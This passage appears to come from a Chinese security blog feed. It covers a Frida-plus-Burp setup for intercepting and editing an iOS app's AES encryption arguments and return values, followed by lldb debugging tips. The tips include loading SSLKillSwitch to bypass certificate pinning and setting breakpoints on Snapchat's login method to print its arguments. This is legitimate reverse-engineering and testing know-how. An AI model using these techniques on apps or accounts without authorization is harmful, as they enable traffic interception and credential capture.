json.loads(req_data)</span></span><br><span class="line">            <span class="comment"># orig_request_url = orig_json_data.pop(u'orig_request_url')</span></span><br><span class="line">            orig_request_url = <span class="string">'execute'</span></span><br><span class="line">            req = requests.request(<span class="string">'REQUEST'</span>,</span><br><span class="line">                                  <span class="string">'http://%s:%d/'</span> % (BURP_HOST, BURP_PORT),</span><br><span class="line">                                  headers=&#123;</span><br><span class="line">                                      <span class="string">'content-type'</span>: <span class="string">'text/plain'</span>,</span><br><span class="line">                                      <span class="string">'ORIG_REQUEST_URI'</span>: orig_request_url</span><br><span class="line">                                  &#125;,</span><br><span class="line">                                  data=req_data)</span><br><span class="line">            return_content = req.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="comment"># req = requests.request('REQUEST', 'http://%s:%d/' % (BURP_HOST, BURP_PORT),</span></span><br><span class="line">            <span class="comment">#                        headers=&#123;'content-type':'text/plain', 'ORIG_REQUEST_URI': orig_request_url&#125;,</span></span><br><span class="line">            <span class="comment">#                        data=json.dumps(orig_json_data))</span></span><br><span class="line">            self._script.post(&#123;<span class="string">'type'</span>:<span class="string">'input'</span>, <span class="string">'payload'</span>: return_content&#125;)</span><br><span class="line">            handled = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> stanza[<span class="string">'from'</span>] == <span class="string">'/response'</span>:</span><br><span class="line">            req_data = stanza[<span class="string">'payload'</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            req = requests.request(<span class="string">'RESPONSE'</span>, <span class="string">'http://%s:%d/'</span> % (BURP_HOST, BURP_PORT),</span><br><span class="line">                                   headers=&#123;<span class="string">'content-type'</span>: <span class="string">'text/plain'</span>&#125;,</span><br><span class="line">                                   data=req_data)</span><br><span class="line">            self._script.post(&#123;<span class="string">'type'</span>: <span class="string">'output'</span>, <span class="string">'payload'</span>: req.content.decode(<span class="string">'utf-8'</span>)&#125;)</span><br><span class="line">            handled = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> handled:</span><br><span class="line">        self.__process_message(message, data, ui)</span><br><span class="line"></span><br><span class="line">tracer.Tracer.__process_message = tracer.Tracer._process_message</span><br><span class="line">tracer.Tracer._process_message = frida_process_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tracer.main()</span><br></pre></td></tr></table></figure>
<h3 id="2-2-127-0-0-1-26080-重定位到-127-0-0-1-27080"><a href="#2-2-127-0-0-1-26080-重定位到-127-0-0-1-27080" class="headerlink" title="2.2 127.0.0.1:26080 重定位到 127.0.0.1:27080"></a>2.2 127.0.0.1:26080 重定位到 127.0.0.1:27080</h3><p><img src="https://i.loli.net/2020/03/13/s4Oja7CBWD2umLv.jpg" alt="-w674"></p>
<h3 id="2-3-回显server接受信息-返回信息"><a href="#2-3-回显server接受信息-返回信息" class="headerlink" title="2.3 回显server接受信息,返回信息"></a>2.3 回显server接受信息,返回信息</h3><ul>
<li>如果没有这个，将返回数据为 burp的代理信息给js代码，并不是burp修改后的数据。</li>
<li>相当于将数据修改后发送到127.0.0.1:27080,然后通过requests.request 返回的数据为回显server回显出来的数据。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> int(platform.python_version_tuple()[<span class="number">0</span>]) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">ECHO_PORT = <span class="number">27080</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_REQUEST</span><span class="params">(self)</span>:</span></span><br><span class="line">        request_path = self.path</span><br><span class="line">        print(<span class="string">'Recving request connction...'</span>)</span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">'content-length'</span>)</span><br><span class="line">        length = int(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(self.rfile.read(length))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_RESPONSE</span><span class="params">(self)</span>:</span></span><br><span class="line">        request_path = self.path</span><br><span class="line">        print(<span class="string">'Recving Response connction...'</span>)</span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">'content-length'</span>)</span><br><span class="line">        length = int(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">        self.wfile.write(self.rfile.read(length))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Listening on localhost: %d'</span> % ECHO_PORT)</span><br><span class="line">    server = HTTPServer((<span class="string">''</span>, ECHO_PORT), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Staring echo server on port %d'</span> % ECHO_PORT)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="2-4-trace-js-测试代码-需改参数和返回值"><a href="#2-4-trace-js-测试代码-需改参数和返回值" class="headerlink" title="2.4 trace js 测试代码,需改参数和返回值"></a>2.4 trace js 测试代码,需改参数和返回值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Called synchronously when about to call +[EncryptUtils AESEncrypt:key:].</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * @this &#123;object&#125; - Object allowing you to store state for use in onLeave.</span></span><br><span class="line"><span class="comment">   * @param &#123;function&#125; log - Call this function with a string to be presented to the user.</span></span><br><span class="line"><span class="comment">   * @param &#123;array&#125; args - Function arguments represented as an array of NativePointer objects.</span></span><br><span class="line"><span class="comment">   * For example use args[0].readUtf8String() if the first argument is a pointer to a C string encoded as UTF-8.</span></span><br><span class="line"><span class="comment">   * It is also possible to modify arguments by assigning a NativePointer object to an element of this array.</span></span><br><span class="line"><span class="comment">   * @param &#123;object&#125; state - Object allowing you to keep state across function calls.</span></span><br><span class="line"><span class="comment">   * Only one JavaScript function will execute at a time, so do not worry about race-conditions.</span></span><br><span class="line"><span class="comment">   * However, do not use this to store function arguments across onEnter/onLeave, but instead</span></span><br><span class="line"><span class="comment">   * use "this" which is an object for keeping state local to an invocation.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">'+[EncryptUtils AESEncrypt:'</span> + args[<span class="number">2</span>] + <span class="string">' key:'</span> + args[<span class="number">3</span>] + <span class="string">']'</span>);</span><br><span class="line">    <span class="keyword">this</span>.args0=args[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">this</span>.args1=args[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">this</span>.args2=args[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">this</span>.args3=args[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_name_nstring = ObjC.selectorAsString(<span class="keyword">this</span>.args1);</span><br><span class="line">    send_data=<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        FH_FUNC_NAME: func_name_nstring,</span><br><span class="line">        FH_ARG_COUNT: <span class="number">3</span>,</span><br><span class="line">        FH_DETAIL_OBJECT: ObjC.Object(<span class="keyword">this</span>.args0).toString(),</span><br><span class="line">        FH_DETAIL_ARG1:   ObjC.Object(<span class="keyword">this</span>.args2).toString(),</span><br><span class="line">        FH_DETAIL_ARG2:   ObjC.Object(<span class="keyword">this</span>.args3).toString(),</span><br><span class="line">        <span class="comment">// FH_DETAIL_RET: ObjC.Object(retval).toString(),</span></span><br><span class="line">    &#125;, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    send(&#123;<span class="attr">from</span>:<span class="string">'/request'</span>, <span class="attr">payload</span>: send_data&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> op = recv(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">        log(<span class="string">"Waiting Input payload"</span>);</span><br><span class="line">        <span class="comment">// log(value.payload);</span></span><br><span class="line">        <span class="comment">// log("Waiting Input recv_data start");</span></span><br><span class="line">        recv_data = <span class="built_in">JSON</span>.parse(value.payload)</span><br><span class="line">        log(recv_data)</span><br><span class="line">        <span class="comment">// log("Waiting Input recv_data end");</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> NSString = ObjC.classes.NSString;</span><br><span class="line">        args[<span class="number">2</span>]  = NSString.alloc().initWithString_(recv_data[<span class="string">"FH_DETAIL_ARG1"</span>]);</span><br><span class="line">        args[<span class="number">3</span>]  = NSString.alloc().initWithString_(recv_data[<span class="string">"FH_DETAIL_ARG2"</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">    op.wait();</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Called synchronously when about to return from +[EncryptUtils AESEncrypt:key:].</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * See onEnter for details.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * @this &#123;object&#125; - Object allowing you to access state stored in onEnter.</span></span><br><span class="line"><span class="comment">   * @param &#123;function&#125; log - Call this function with a string to be presented to the user.</span></span><br><span class="line"><span class="comment">   * @param &#123;NativePointer&#125; retval - Return value represented as a NativePointer object.</span></span><br><span class="line"><span class="comment">   * @param &#123;object&#125; state - Object allowing you to keep state across function calls.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(retval);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_name_nstring = ObjC.selectorAsString(<span class="keyword">this</span>.args1);</span><br><span class="line">    send_data=<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        FH_FUNC_NAME: func_name_nstring,</span><br><span class="line">        FH_DETAIL_RET: ObjC.Object(retval).toString(),</span><br><span class="line">    &#125;, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    send(&#123;<span class="attr">from</span>:<span class="string">'/response'</span>, <span class="attr">payload</span>: send_data&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> op = recv(<span class="string">'output'</span>, <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">        log(<span class="string">"Waiting output payload"</span>);</span><br><span class="line">        <span class="comment">// log(value.payload);</span></span><br><span class="line">        <span class="comment">// log("Waiting output recv_data start");</span></span><br><span class="line">        recv_data = <span class="built_in">JSON</span>.parse(value.payload)</span><br><span class="line">        log(recv_data)</span><br><span class="line">        <span class="comment">// log("Waiting output recv_data end");</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> NSString = ObjC.classes.NSString;</span><br><span class="line">        <span class="keyword">var</span> tmp_retval = NSString.alloc().initWithString_(recv_data[<span class="string">"FH_DETAIL_RET"</span>]);</span><br><span class="line">        retval.replace(tmp_retval);</span><br><span class="line">    &#125;);</span><br><span class="line">    op.wait();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-测试效果"><a href="#3-测试效果" class="headerlink" title="3.测试效果"></a>3.测试效果</h2><h3 id="3-1-burp接受函数参数包"><a href="#3-1-burp接受函数参数包" class="headerlink" title="3.1 burp接受函数参数包"></a>3.1 burp接受函数参数包</h3><p><img src="https://i.loli.net/2020/03/13/vC6QbUEVcH21rfY.jpg" alt="-w468"><br>可以进行修改，然后点击Forward</p>
<h3 id="3-2-burp接受函数返回包"><a href="#3-2-burp接受函数返回包" class="headerlink" title="3.2 burp接受函数返回包"></a>3.2 burp接受函数返回包</h3><p><img src="https://i.loli.net/2020/03/13/Pni6xCwveEyF9UL.jpg" alt="-w504"><br>可以进行修改，然后点击Forward</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><ul>
<li>直接测试所有二进制的函数进出返回值，用于测试工作，剩下工作就是编写合适的 js 代码,将trace的函数用于通用。当然也可以不用trace,自己写hook 框架，达到任意修改函数返回值的效果。</li>
<li>如果函数有时间校验的话，可能会出错，这时候用代码实现修改即可。</li>
</ul>
]]></content>
      <categories>
        <category>tools</category>
        <category>frida</category>
      </categories>
      <tags>
        <tag>frida</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>lldb_help</title>
    <url>/2020/02/23/tips_about/lldb-help/</url>
    <content><![CDATA[<p>[TOC]</p>
<a id="more"></a>
<h1 id="some-gdb-tips"><a href="#some-gdb-tips" class="headerlink" title="some gdb tips"></a>some gdb tips</h1><h2 id="在具体地址下断"><a href="#在具体地址下断" class="headerlink" title="在具体地址下断"></a>在具体地址下断</h2><p>break *0x0000000000400448</p>
<h1 id="some-lldb-tips"><a href="#some-lldb-tips" class="headerlink" title="some lldb tips"></a>some lldb tips</h1><h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><h3 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h3><h4 id="error-process-launch-failed-unable-to-locate-lldb-server"><a href="#error-process-launch-failed-unable-to-locate-lldb-server" class="headerlink" title="error: process launch failed: unable to locate lldb-server"></a>error: process launch failed: unable to locate lldb-server</h4><p>sudo ln -s  /usr/bin/lldb-server-3.8 /usr/bin/lldb-server</p>
<h2 id="加载so-动态库等"><a href="#加载so-动态库等" class="headerlink" title="加载so 动态库等"></a>加载so 动态库等</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  (lldb) expr (void*)dlopen(&quot;&#x2F;path&#x2F;to&#x2F;build&#x2F;SSLKillSwitch.framework&#x2F;Versions&#x2F;A&#x2F;SSLKillSwitch&quot;, 1)</span><br><span class="line">  (lldb) expr (void*)dlopen(&quot;&#x2F;Library&#x2F;MobileSubstrate&#x2F;DynamicLibraries&#x2F;Reveal2Loader.dylib&quot;,1)</span><br><span class="line">  (lldb) </span><br><span class="line">  command alias reveal_load_sim expr (void*)dlopen(&quot;&#x2F;Applications&#x2F;Reveal.app&#x2F;Contents&#x2F;SharedSupport&#x2F;iOS-Libraries&#x2F;RevealServer.framework&#x2F;RevealServer&quot;, 0x2);</span><br><span class="line">  (lldb) expr (void*)dlopen(&quot;&#x2F;Library&#x2F;RHRevealLoader&#x2F;libReveal.dylib&quot;,1)</span><br><span class="line">  (void *) $1 &#x3D; 0x00007f92e74d10c0</span><br><span class="line">Using DYLD_INSERT_LIBRARIES to inject SSLKillSwitch and start the process.</span><br></pre></td></tr></table></figure>
<h2 id="lldb-expr-相关"><a href="#lldb-expr-相关" class="headerlink" title="lldb expr 相关"></a>lldb expr 相关</h2><p>[xxx setHidden:YES]  show/hide<br>caflush  Force Core Animation to flush. This will ‘repaint’ the UI but also may mess with ongoing animations</p>
<h3 id="断点相关"><a href="#断点相关" class="headerlink" title="断点相关"></a>断点相关</h3><h4 id="1-对函数下断点"><a href="#1-对函数下断点" class="headerlink" title="1. 对函数下断点"></a>1. 对函数下断点</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">breakpoint <span class="built_in">set</span> -n text: -c ret == YES    //使用-c设置条件断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -f xxx.m -l 38            //使用-f指定文件 使用-l指定文件某一行设置断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -n <span class="string">"-[xxx xxx]"</span>           //根据函数名下断点(调试信息)</span><br><span class="line">breakpoint <span class="built_in">set</span> -a VitrualAddress         //根据虚拟地址下断点</span><br><span class="line"></span><br><span class="line">b isEven, br s -F isEven  //符号断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -f main.m -l 16：在源码文件的某一行断点</span><br><span class="line">b main.m:17。b是_regexp-break的缩写</span><br><span class="line"></span><br><span class="line">breakpoint modify -c <span class="string">'i == 99'</span> 1   //条件断点</span><br><span class="line">断点时附加自定义操作：breakpoint <span class="built_in">command</span> add 1</span><br></pre></td></tr></table></figure>
<h4 id="2-观察断点"><a href="#2-观察断点" class="headerlink" title="2.观察断点"></a>2.观察断点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">watchpoint set expression -w write ―- 0xl01801a48 :给某个地址设置观察断点,内存进行写操作时就会触发断点</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取需要监控的内存地址</span><br><span class="line">p (ptrdiff_t)ivar_getOffset((struct Ivar *)class_getInstanceVariable([MyView class], &quot;_layer&quot;))</span><br><span class="line"></span><br><span class="line">(ptrdiff_t) $0 &#x3D; 8</span><br><span class="line"></span><br><span class="line">watchpoint set expression -- (int *)$myView + 8：监控_layer的地址</span><br><span class="line"></span><br><span class="line">变量监控：watchpoint set variable -w read_write</span><br><span class="line">条件监控：watchpoint modify -c &#39;(global&#x3D;&#x3D;5)&#39;</span><br></pre></td></tr></table></figure>
<h4 id="3-断点后执行命令"><a href="#3-断点后执行命令" class="headerlink" title="3.断点后执行命令"></a>3.断点后执行命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b +[Manager performLoginWithUsernameOnEmail: password: preAuthToken: twoFAMethod: confirmReactivation:rememberDevice:fromDeepLink:onComplete:]</span><br><span class="line">Breakpoint 2: where &#x3D; Snapchat&#39;+[Manager</span><br><span class="line">br com add 2</span><br><span class="line">&gt; po $x2</span><br><span class="line">&gt; po $x3</span><br><span class="line">&gt; c</span><br><span class="line">&gt; po F.viewCFG()</span><br><span class="line">&gt; DONE</span><br></pre></td></tr></table></figure>
<h4 id="7-如何将断点设置在动态库的入口"><a href="#7-如何将断点设置在动态库的入口" class="headerlink" title="7.如何将断点设置在动态库的入口"></a>7.如何将断点设置在动态库的入口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LLDB命令行进行调试时自 动中断在 _dyld_start 处，因为此时dyld已经加载，所以在dyld里面设置一个在所有库中加载并且在constructor 函数执行之前执行的断点，例如initializeMainExecutable</span><br><span class="line">settings set target.process.stop-on-sharedlibrary-events 1</span><br></pre></td></tr></table></figure>
<h4 id="8-插件断点"><a href="#8-插件断点" class="headerlink" title="8.插件断点"></a>8.插件断点</h4><p>bdisable    用正则查找并关闭一组断点<br>benable    用正则查找并开启一组断点<br>binside    用相对地址设置断点，自动加上 ALSR 偏移<br>bmessage    给某个类的 method 设置断点，同时会在其父类上查找 method<br>pinvocation    打印方法调用堆栈，仅支持x86</p>
<h4 id="9-某个类的所有方法下断点并跟踪打印调用参数"><a href="#9-某个类的所有方法下断点并跟踪打印调用参数" class="headerlink" title="9.某个类的所有方法下断点并跟踪打印调用参数"></a>9.某个类的所有方法下断点并跟踪打印调用参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command regex bclass &#39;s&#x2F;(.+)&#x2F;rb \[%1 &#x2F;&#39;</span><br><span class="line">rb -&gt; breakpoint set -r %1</span><br><span class="line">bclass ULLoginViewController -&gt; breakpoint set -r \[ULLoginViewController</span><br><span class="line"></span><br><span class="line">br set -r &#39;\[WAChatSessionViewController .*\]&#39;</span><br><span class="line"></span><br><span class="line">如果不在MethodTraCeCcmflg.PliSt文件里面配置需要跟踪的类，那么如下设置:</span><br><span class="line">@interface MethodTrace : NSObject</span><br><span class="line">+ (void)addClassTrace:(NSString*) className;</span><br><span class="line">+ (void)addClassTrace: (NSString *)className methodName: (NSString*) methodName;</span><br><span class="line">+ (void)addClassTrace: (NSString *)className methodList: (NSArray*) methodList;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">e [MethodTrace addClassTrace:@&quot;WAChatDataStore&quot;]</span><br><span class="line">笔者在MethodTrace的代码里面调试了—下，发现 NSLog没有被输出到Xcode的控制台，但是在Console.app里面可以看到NSLog,所以改用printf来输出。</span><br><span class="line">ENABLE_METHODTRACE</span><br></pre></td></tr></table></figure>
<h4 id="Finding-a-class-with-a-click"><a href="#Finding-a-class-with-a-click" class="headerlink" title="Finding a class with a click"></a>Finding a class with a click</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) b -[NSView hitTest:]</span><br><span class="line">Breakpoint 1: where &#x3D; AppKit&#96;-[NSView hitTest:], address &#x3D; 0x000000010338277b</span><br><span class="line">breakpoint set -n  &quot;-[NSView hitTest:]&quot; -C &quot;real&quot; -G1</span><br><span class="line">b -[NSResponder mouseUp:]</span><br></pre></td></tr></table></figure>
<h4 id="Filter-breakpoints-for-important-content"><a href="#Filter-breakpoints-for-important-content" class="headerlink" title="Filter breakpoints for important content"></a>Filter breakpoints for important content</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">breakpoint modify -c &#39;(BOOL)[NSStringFromClass((id)[$rdi class]) containsString:@&quot;IDESourceEditorView&quot;]&#39; -G0</span><br><span class="line">最后-G0说的是修改断点，使其在执行动作后不会自动恢复执行。</span><br><span class="line"></span><br><span class="line">(lldb) breakpoint set -n &quot;-[UIViewController viewDidLoad]&quot; -C &quot;po $arg1&quot; -G1</span><br><span class="line">-G1选项告诉断点在执行命令后自动继续。</span><br></pre></td></tr></table></figure>
<h4 id="在模块下断"><a href="#在模块下断" class="headerlink" title="在模块下断"></a>在模块下断</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) rb appendSignal.*_block_invoke -s Commons</span><br></pre></td></tr></table></figure>
<h4 id="启动后断在"><a href="#启动后断在" class="headerlink" title="启动后断在"></a>启动后断在</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-s ( --stop-at-entry )</span><br><span class="line">            Stop at the entry point of the program when launching a process.</span><br><span class="line"></span><br><span class="line">(lisa)target create tests&#x2F;binaries&#x2F;abort</span><br><span class="line">(lisa)process launch -s</span><br></pre></td></tr></table></figure>

<h3 id="设置lldb-使用python2"><a href="#设置lldb-使用python2" class="headerlink" title="设置lldb 使用python2"></a>设置lldb 使用python2</h3><p>defaults write com.apple.dt.lldb DefaultPythonVersion 2</p>
<h3 id="计算偏移-ida地址"><a href="#计算偏移-ida地址" class="headerlink" title="计算偏移/ida地址"></a>计算偏移/ida地址</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p&#x2F;x 0X000000010095ECCC+0X0000000000038000</span><br><span class="line">(lldb) p&#x2F;x 0x0000000100e595b4-0x0000000000038000 (long) $18 &#x3D; 0x0000000100e215b4</span><br><span class="line">查看某个地址所在模块的信息</span><br></pre></td></tr></table></figure>

<h3 id="读取目标地址的内存指令"><a href="#读取目标地址的内存指令" class="headerlink" title="读取目标地址的内存指令"></a>读取目标地址的内存指令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x2F;10xg 0xl01801a48 这里的x 表示用十六进制来显示结果。&quot;g&quot;代表giant word(8字节)大小。所以就是用十六进制显示 0x101801a48所指恐惧的10个64位的元素内容。常见的大小格式为&quot;b-byte&quot;(1字节),&quot;h-half word&quot;(2字节),&quot;w- word”(4字节),&quot;g-giantword”(8字节)。</span><br></pre></td></tr></table></figure>
<h3 id="dis-a-pc-反汇编指定地址"><a href="#dis-a-pc-反汇编指定地址" class="headerlink" title="dis-a$pc 反汇编指定地址"></a>dis-a$pc 反汇编指定地址</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里是pc寄存器所对应的地址。</span><br></pre></td></tr></table></figure>
<h3 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f2:切换到当前调用栈为2的位置，也就是bt中的frame #2。</span><br></pre></td></tr></table></figure>
<h3 id="threadinfo-输出当前线程的信息。"><a href="#threadinfo-输出当前线程的信息。" class="headerlink" title="threadinfo:输出当前线程的信息。"></a>threadinfo:输出当前线程的信息。</h3><h3 id="b-ptrace-c-xxx-满足某个条件之后程序才会中断。"><a href="#b-ptrace-c-xxx-满足某个条件之后程序才会中断。" class="headerlink" title="b ptrace -c xxx:满足某个条件之后程序才会中断。"></a>b ptrace -c xxx:满足某个条件之后程序才会中断。</h3><h3 id="help-apropos"><a href="#help-apropos" class="headerlink" title="help/apropos"></a>help/apropos</h3><h3 id="xcode预处理快捷键"><a href="#xcode预处理快捷键" class="headerlink" title="xcode预处理快捷键"></a>xcode预处理快捷键</h3><p>单击 Product -&gt; PerformAction -&gt;Preprocess xxxx 可以对文件进行预处理，还可以将代码转换成汇编代码。可以帮助我们理解这些宏的作用</p>
<h3 id="pdb来排查了一个脚本中的问题"><a href="#pdb来排查了一个脚本中的问题" class="headerlink" title="pdb来排查了一个脚本中的问题"></a>pdb来排查了一个脚本中的问题</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) findclass</span><br><span class="line">error: libarclite_macosx.a(arclite.o) failed to load objfile for &#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Toolchains&#x2F;XcodeDefault.xctoolchain&#x2F;usr&#x2F;lib&#x2F;arc&#x2F;libarclite_macosx.a</span><br><span class="line">error: libarclite_macosx.a(arclite.o) failed to load objfile for &#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Toolchains&#x2F;XcodeDefault.xctoolchain&#x2F;usr&#x2F;lib&#x2F;arc&#x2F;libarclite_macosx.a</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;Users&#x2F;gogleyin&#x2F;lldb&#x2F;findclass.py&quot;, line 40, in findclass</span><br><span class="line">    raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line">AssertionError: Uhoh... something went wrong, can you figure it out? :]</span><br><span class="line"></span><br><span class="line">(lldb) script import pdb</span><br><span class="line">(lldb) findclass</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;Users&#x2F;gogleyin&#x2F;lldb&#x2F;findclass.py&quot;, line 40, in findclass</span><br><span class="line">    raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line">AssertionError: Uhoh... something went wrong, can you figure it out? :]</span><br><span class="line"></span><br><span class="line">(lldb) script pdb.pm()</span><br><span class="line">&gt; &#x2F;Users&#x2F;gogleyin&#x2F;lldb&#x2F;findclass.py(40)findclass()</span><br><span class="line">-&gt; raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line"></span><br><span class="line">(Pdb) print(codeString)  # 这个东西包含了一段oc代码，用oc runtime来找出runtime的所有类</span><br><span class="line">    @import Foundation;</span><br><span class="line">    int numClasses;</span><br><span class="line">    Class * classes &#x3D; NULL;</span><br><span class="line">    classes &#x3D; NULL;</span><br><span class="line">    numClasses &#x3D; objc_getClassList(NULL, 0);</span><br><span class="line">    NSMutableString *returnString &#x3D; [NSMutableString string];</span><br><span class="line">    classes &#x3D; (__unsafe_unretained Class *)malloc(sizeof(Class) * numClasses);</span><br><span class="line">    numClasses &#x3D; objc_getClassList(classes, numClasses);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; numClasses; i++) &#123;</span><br><span class="line">      Class c &#x3D; classes[i];</span><br><span class="line">      [returnString appendFormat:@&quot;%s,&quot;, class_getName(c)];</span><br><span class="line">    &#125;</span><br><span class="line">    free(classes);</span><br><span class="line">    returnString;  # 返回returnString的值给Python脚本</span><br><span class="line"></span><br><span class="line">(Pdb) l 35, 45  # 会列出35到45行代码，注意40行的 -&gt; 表示当前pdb停在的位置</span><br><span class="line"> 35         &#39;&#39;&#39;</span><br><span class="line"> 36</span><br><span class="line"> 37         res &#x3D; lldb.SBCommandReturnObject()</span><br><span class="line"> 38         debugger.GetCommandInterpreter().HandleCommand(&quot;expression -lobjc -O -- &quot; + codeString, res)</span><br><span class="line"> 39         if res.GetError():</span><br><span class="line"> 40  -&gt;         raise AssertionError(&quot;Uhoh... something went wrong, can you figure it out? :]&quot;)</span><br><span class="line"> 41         elif not res.HasResult():</span><br><span class="line"> 42             raise AssertionError(&quot;There&#39;s no result. Womp womp....&quot;)</span><br><span class="line"> 43</span><br><span class="line"> 44         returnVal &#x3D; res.GetOutput()</span><br><span class="line"> 45         resultArray &#x3D; returnVal.split(&quot;,&quot;)</span><br><span class="line"># 嗯，似乎res.GetError()看起来更加有趣，玩一下先</span><br><span class="line"></span><br><span class="line">(Pdb) print res.GetError()</span><br><span class="line">error: &#39;objc_getClassList&#39; has unknown return type; cast the call to its declared return type</span><br><span class="line">error: &#39;objc_getClassList&#39; has unknown return type; cast the call to its declared return 